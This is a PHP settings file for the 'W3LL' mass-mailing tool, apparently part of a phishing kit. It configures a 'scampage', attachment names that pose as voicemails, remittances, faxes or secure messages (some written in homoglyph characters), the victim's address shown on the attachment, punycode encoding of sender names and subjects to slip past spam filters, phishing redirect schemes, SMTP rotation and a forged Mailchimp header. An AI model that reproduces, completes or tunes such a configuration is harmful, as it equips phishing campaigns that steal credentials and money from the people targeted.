<?php

/*DON'T CHANGE THIS*/
include 'settings.php';
$random1 = RandString(35);
$random2 = RandString(12);
/*DON'T CHANGE THIS*/

$W3LL_setup = [


		/*SENDER FROM NAME*/
		
		"fromname"=> [
		
			"*new-message@++w3ll_domain++",
		],

		/*SENDER FROM NAME*/

		/*SENDER FROM MAIL*/

		"frommail"=> "++w3ll_smtp++", //Sender from mail | Default is ++w3ll_smtp++

		/*SENDER FROM NAME*/

		/*SENDER SUBJECT*/

		"subject"=> [
		
		"++w3ll_time++ ++w3ll_date++",
		
		],

		/*SENDER SUBJECT*/


		/*DON'T CHANGE THIS*/
		"mail_list"=> $mail_list,"msgfile"=> $msg_file, "attach" => $attachment,"scampage"=> $scampage,
		/*DON'T CHANGE THIS*/

		/*TURN ON LETTER ENCRYPT*/
		
		"encrypt_letter" => 0, //(1 = Turn on Letter encrypt)
		
		/*TURN ON LETTER ENCRYPT*/
		
		/*TURN ON FROM NAME ENCRYPT*/

		"fromname_encrypt" => 0, //(1 = Turn onEncrypt Email Fromname)
		
		"fromname_encode_type" => "punycode",
		
		//punnycode = Change all the letters to punycode letters
		//html_entities = Be able to encrypt all letter into html entities

		/*TURN ON FROM NAME ENCRYPT*/

		/*TURN ON SUBJECT ENCRYPT*/

		"subject_encrypt" => 0, //(1 = Turn on Encrypt Email Subject)
		
		"subject_encode_type" => "punycode",
		
		//punnycode = Change all the letters to punycode letters
		//html_entities = Be able to encrypt all letter into html entities

		/*TURN ON SUBJECT ENCRYPT*/
		
		/*SENDER SENDING TYPE*/
		
		"send_type"=> "to",
		
		// cc = sending email with cc format
		// bcc = sending email with bcc format
		// set it empty to send with To format
		
		/*SENDER SENDING TYPE*/
		
		/*SENDER ENCODING TYPE*/
		
		"encoding"=> "base64",
		
		// base64 = encrypt all with base64
		// 8bit = encrypt all with 8bit
		// quoted_printable = encrypt all with quoted_printable
		
		/*SENDER ENCODING TYPE*/
		
		/*SENDER PRIORITY*/
		
		"priority"=> 3, 
		
		// 1 = Very Important 
		// 2 = Important
		// 3 = Normal

		/*SENDER PRIORITY*/

		/*SENDER DELAY PER EMAIL*/

		"sleeptime"=> 5, // (Delay Per Email, Default 5)

		/*SENDER DELAY PER EMAIL*/

		/*EMAIL RATIO PER DELAY*/

		"ratio" => 1, // (Ratio Email Per Delay, Default 1)

		/*EMAIL RATIO PER DELAY*/

		/*REMOVE SPAMMED EMAIL*/

		"userremoveline" => 0, // (1= Turn on Remove Spammed Email From List.)

		/*REMOVE SPAMMED EMAIL*/
		
	    /*USE CUSTOM NAME*/

		"custom_name" => false, // (true= Turn on custom name.)

		/*USE CUSTOM NAME*/

		/*ATTACHMENT*/

		"filesend" => 0,
		
		// 0 = turn off
		// 1 = Send Attachment File With Random Name. 
		// 2 = Send Attachment With Doc File.
		// 3 = Send Attachment With The Real Name/with attachment type.

		"attachment_type" => "email",
		
		// voicemail = Show 📞_𝙼𝚎𝚜𝚜𝚊𝚐𝚎 on attachment file name. 
		// remittance = Show Remittance on attachment file name.
		// keep password = Show PASS_ID on attachment file name.		
		// message fail = Show Message Fail Delivered on attachment file name.
		// fax = Show 𝙵‍a𝚡‍＿𝙸𝙳 on attachment file name.
		// secure = Show 𝚂‍e𝚌‍𝚞‍𝚛‍e𝙼‍e𝚜‍𝚜‍a𝚐‍e on attachment file name.
		// email = Show victim email on attachment file name.
		// set it empty to send with real attachment file name

		"type_filesend" => "html", 
		
		// doc = Send doc attachment file.
		// pdf = Send pdf attachment file.
		// html = Send html attachment file.
		
		/*ATTACHMENT*/

		/*SET RESIRECT LINK TYPE*/

		"redirect" => 6,

		// 1 = Use on link [?email=email base64]. 
		// 2 = Use on link [?a=base64]. 
		// 3 = Use on link [?email=email]. 
		// 4 = Can use all shortlink including google redirect
		// 5 = Use on link [#base64]. ==> FOR SENDGRID REDIRECT
		// 6 = FOR W3LL PRIV PAGE
		// 7 = Use on link [#email].
		// 8 = Google ads redirect [Just for attacment and private page].
		// 9 = Use W3ll.store official redirect
		// set it empty to send with manual page

		/*SET RESIRECT LINK TYPE*/

		/*SETTING REDIRECT 9*/

		"username" => "YOUR W3LL STORE USER HERE", //your w3ll.store username
		"password" => "YOUR W3LL STORE PASSWORD HERE", //your w3ll.store password
		"ids" => "YOUR REDIRECT ID HERE", //Redirect id from store

		/*SETTING REDIRECT 9*/

		/*EMAIL TEST FUNCTION*/

		"email_test" => 0, //(1 = Turn on Testing Email)
		"test_every" => 100, //Send Mail Test Every
		"email_destination" => "PUT YOUR TEST EMAIL HERE", //Testing Destination

		/*EMAIL TEST FUNCTION*/

		/*CUSTOM HEADER FUNCTION*/

		"custom_header" => 0, //(1 = Turn on Custom Header)
		"header"=> [
			"Message-ID: <$random1.$random2@systemalerts14.mailchimp.com>", // Custom Mail Header 1
			"MIME-Version: 1.0",  // Custom Mail Header 2
		],

		/*CUSTOM HEADER FUNCTION*/

		/*REPLY TO FUNCTION*/

		"replyto" => "PUT YOUR REPLY TO EMAIL HERE", // ReplyTo Email

		/*REPLY TO FUNCTION*/

		/*DON'T CHANGE THIS*/
		"replacement" => 1, //(1= Use Replacement Function. Ex:++w3ll_short++)
		/*DON'T CHANGE THIS*/
		
		/*SENDER TIMEZONE*/
		
		"timezone" => "America/Los_Angeles", // Timezones, Check here 'https://www.w3schools.com/php/php_ref_timezones.asp'
		
		/*SENDER TIMEZONE*/
		
		/*SMTP ERROR*/
		
		"smtp_server404" => "", // Put your email server here if your smtp is working on other mailer but not on W3LL
		
		/*SMTP ERROR*/
		
		/*DELETE SMTP*/
		
		"delete_smtp" => 0, // 1 = Automaticly remove not working smtp from settings.php
		
		/*DELETE SMTP*/
		
		/*DEBUG SMTP*/

		"smtp_debug" => 0,
		
		// 1 = client; will show you messages sent by the client
		// 2  = client and server; will add server messages, it’s the recommended setting.
		// 3 = client, server, and connection; will add information about the initial information, might be useful for discovering STARTTLS failures
		// 4 = low-level information. 

		/*DEBUG SMTP*/

];

/* END */


?>